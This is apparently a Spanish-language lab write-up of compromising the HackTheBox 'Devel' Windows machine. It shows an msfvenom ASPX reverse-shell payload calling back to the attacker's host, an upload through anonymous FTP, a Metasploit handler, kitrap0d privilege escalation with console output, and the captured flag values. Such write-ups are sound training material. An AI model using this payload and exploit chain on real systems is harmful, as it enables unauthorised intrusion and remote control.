# Devel

Plataforma: HackTheBox
OS: Windows
Level: Easy
Status: Done
Complete: Yes
EJPT: yes
Created time: 2 de febrero de 2025 15:36
IP: 10.10.10.5

## Recopilación de información

<aside>
💡 Reconocimiento general

</aside>

Siste

```bash
whichSystem.py 10.10.10.5

	10.10.10.5 (ttl -> 127): Windows
```

### **Escaneo de puertos**

Comenzamos con un escaneo para identificar que puertos están abiertos.

---

```bash
sudo nmap -p- --open -T5 -sS --min-rate 5000 -n -Pn -vvv 10.10.10.5 -oG targeted

PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 127
80/tcp open  http    syn-ack ttl 127
```

### **Enumeración de servicios**

Una vez listado los puertos accesibles, procederemos a realizar la enumeración de servicios para su posterior identificación de vulnerabilidades.

---

```bash
sudo nmap -p21,80 -sCV 10.10.10.5 -oN targeted

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  01:06AM       <DIR>          aspnet_client
| 03-17-17  04:37PM                  689 iisstart.htm
|_03-17-17  04:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
| http-methods: 
|_  Potentially risky methods: TRACE
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

- **Identificación de vulnerabilidades**
    - 21/tcp open  ftp     Microsoft ftpd
    - 80/tcp open  http    Microsoft IIS httpd 7.5

- **Enumeración FTP**
    
    Vemos que tiene permitido el acceso con usuario “Anonymous”
    
    ```bash
    ftp anonymous@10.10.10.5
    Connected to 10.10.10.5.
    220 Microsoft FTP Service
    331 Anonymous access allowed, send identity (e-mail name) as password.
    Password: 
    230 User logged in.
    Remote system type is Windows_NT.
    ftp> ls
    229 Entering Extended Passive Mode (|||49158|)
    125 Data connection already open; Transfer starting.
    03-18-17  01:06AM       <DIR>          aspnet_client
    03-17-17  04:37PM                  689 iisstart.htm
    03-17-17  04:37PM               184946 welcome.png
    226 Transfer complete.
    ftp> cd aspnet_client
    250 CWD command successful.
    ftp> ls
    229 Entering Extended Passive Mode (|||49160|)
    125 Data connection already open; Transfer starting.
    03-18-17  01:06AM       <DIR>          system_web
    226 Transfer complete.
    ftp> cd system_web
    250 CWD command successful.
    ftp> ls
    229 Entering Extended Passive Mode (|||49162|)
    125 Data connection already open; Transfer starting.
    03-18-17  01:06AM       <DIR>          2_0_50727
    226 Transfer complete.
    ftp> cd 2_0_50727
    250 CWD command successful.
    ftp> ls
    ```
    
    Vemos que podemos subir ficheros al servidor y vemos que se trata de un IIS que usa ASPnet.
    
    Generamos un payload con MSFvenom para obtener una rever con meterpreter
    
    ```bash
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.15 LPORT=4444 -f aspx > aspx_met_10.10.16.15_4444.aspx
    ```
    
    Lo subimos a la raiz del ftp
    
    ```bash
    ftp> put aspx_met_10.10.16.15_4444.aspx
    ```
    

## Explotación

<aside>
💡 Probamos diferentes accesos

</aside>

### Explotación 1

Creamos en metasploit una sesion para obtener la rever:

```bash
msf > use exploit/multi/handler
msf > set payload_windows/meterpreter/reverse_tcp
msf > set LHOST 10.10.16.15
msf > run
```

Accedermos al fichero que hemos subido con 

```bash
http://10.10.10.5/aspx_met_10.10.16.15_4444.aspx
```

Obtenemos la session de meterpreter. Vemos que esta el usuario babis per no tenemos permisos para ver nada.

Siguiendo las notas de HTB usamos el modulo de reconocimiento : local_exploit_suggestion

```bash
# Primero ponemos nuestra session en backgrount
msf > cntl+Z
msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1
msf6 post(multi/recon/local_exploit_suggester) > use

```

### Explotación 2

### Explotación posterior

<aside>
💡 Accedemos con las credenciales encontradas

</aside>

### Escalada de privilegios

Exploits sugeridos

```bash
 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/bypassuac_comhijack                      Yes                      The target appears to be vulnerable.
 2   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   Yes                      The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build detected!
 4   exploit/windows/local/ms10_015_kitrap0d                        Yes                      The service is running, but could not be validated.
 5   exploit/windows/local/ms10_092_schelevator                     Yes                      The service is running, but could not be validated.
 6   exploit/windows/local/ms13_053_schlamperei                     Yes                      The target appears to be vulnerable.
 7   exploit/windows/local/ms13_081_track_popup_menu                Yes                      The target appears to be vulnerable.
 8   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
 9   exploit/windows/local/ms15_004_tswbproxy                       Yes                      The service is running, but could not be validated.
 10  exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
 11  exploit/windows/local/ms16_016_webdav                          Yes                      The service is running, but could not be validated.
 12  exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
 13  exploit/windows/local/ms16_075_reflection                      Yes                      The target appears to be vulnerable.
 14  exploit/windows/local/ms16_075_reflection_juicy                Yes                      The target appears to be vulnerable.
 15  exploit/windows/local/ntusermndragover                         Yes                      The target appears to be vulnerable.
 16  exploit/windows/local/ppr_flatten_rec                          Yes                      The target appears to be vulnerable.
 
```

Probamos con varios pero no funciona. 

Encontramos que funciona:

```bash
msf > exploit/windows/local/ms10_015_kitrap0d  
msf6 exploit(windows/local/ms10_015_kitrap0d) > set SESSION 1
SESSION => 1
msf6 exploit(windows/local/ms10_015_kitrap0d) > run
[-] Handler failed to bind to 10.10.16.15:4444:-  -
[-] Handler failed to bind to 0.0.0.0:4444:-  -
[*] Reflectively injecting payload and triggering the bug...
[*] Launching netsh to host the DLL...
[+] Process 2184 launched.
[*] Reflectively injecting the DLL into 2184...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Exploit completed, but no session was created.
msf6 exploit(windows/local/ms10_015_kitrap0d) > run
[*] Started reverse TCP handler on 10.10.16.15:4444 
[*] Reflectively injecting payload and triggering the bug...
[*] Launching msiexec to host the DLL...
[+] Process 716 launched.
[*] Reflectively injecting the DLL into 716...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (177734 bytes) to 10.10.10.5
[*] Meterpreter session 2 opened (10.10.16.15:4444 -> 10.10.10.5:49211) at 2025-02-02 17:20:23 +0100

meterpreter > ls

Listing: c:\users\babis\Desktop
===============================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2017-03-17 15:17:51 +0100  desktop.ini
100444/r--r--r--  34    fil   2025-02-02 15:36:39 +0100  user.txt

meterpreter > type us
[-] Unknown command: type. Run the help command for more details.
meterpreter > cat user.txt 
993f957c1590e6b4afbb134baea8776f
```

User Flag: 993f957c1590e6b4afbb134baea8776f

```bash
meterpreter > ls
Listing: c:\users\Administrator\Desktop
=======================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2017-03-18 00:16:53 +0100  desktop.ini
100444/r--r--r--  34    fil   2025-02-02 15:36:39 +0100  root.txt

meterpreter > cat root.txt 
66754e88f3a4b81e993d865d3f4353eb
```

Root flag: 66754e88f3a4b81e993d865d3f4353eb

## Conclusión

<aside>
💡 Maquina facil en la que he aprendido a manejar un poco mejor metasploit. Me he estancado en ver como ejecutar la rever en el servidor. Intentaba explotarlo a traves del enlace del html

</aside>